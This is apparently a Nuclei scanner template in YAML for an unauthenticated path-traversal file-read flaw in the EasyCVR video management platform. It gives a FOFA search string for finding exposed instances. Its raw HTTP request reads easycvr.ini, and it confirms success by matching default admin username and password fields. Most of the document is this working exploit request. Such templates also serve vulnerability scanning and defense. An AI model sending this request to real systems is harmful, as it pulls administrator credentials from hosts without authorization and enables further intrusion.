id: EasyCVR-taillog-File-reading

info:
  name: "EasyCVR taillog 接口路径遍历导致任意文件读取"
  author: Unknown
  severity: high
  description: |-
    fofa: title="EasyCVR"
    EasyCVR 视频管理平台在 taillog 接口实现中存在路径遍历与文件访问控制缺陷，攻击者可利用该漏洞在未认证状态下访问并提取系统敏感文件（包括但不限于数据库配置文件、系统级配置文件等）。该漏洞可能被用于获取系统凭证信息，进而实施横向渗透攻击，导致完整的系统控制权丧失。
  reference:
  - https://mp.weixin.qq.com/s/Kz-uasc64m7xOn_z8gCZYg?token=17877307&lang=zh_CN
  tags: EasyCVR


http:
- raw:
  - |
    GET /taillog/oxsecl/..\easycvr.ini HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'default_admin_user='
    - 'default_admin_password='
    - '[user_default]'
    condition: and
  - type: status
    status:
    - 200
